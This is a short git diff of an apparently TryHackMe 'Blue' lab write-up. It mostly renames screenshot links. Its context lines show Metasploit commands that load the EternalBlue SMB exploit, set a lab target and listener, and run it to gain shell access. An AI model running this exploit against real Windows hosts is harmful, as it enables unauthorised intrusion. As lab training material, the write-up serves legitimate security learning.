@@ -59,7 +59,7 @@ msfconsole
 use exploit/windows/smb/ms17_010_eternalblue
 ```
 
-![Exploit Loaded](images/exploit-loaded.png)
+![Exploit Loaded](images/THM - blue-metasploit-module.png)
 
 ---
 
@@ -69,15 +69,10 @@ use exploit/windows/smb/ms17_010_eternalblue
 set RHOSTS 10.10.239.14
 set LHOST <your IP>
 run
-```
-
-![Exploit Config](images/exploit-config.png)
-
----
 
 ### ✅ Shell Access
 
-![Shell Access](images/shell.png)
+![Shell Access](images/THM - blue-exploit-success.png)
 
 ---
 
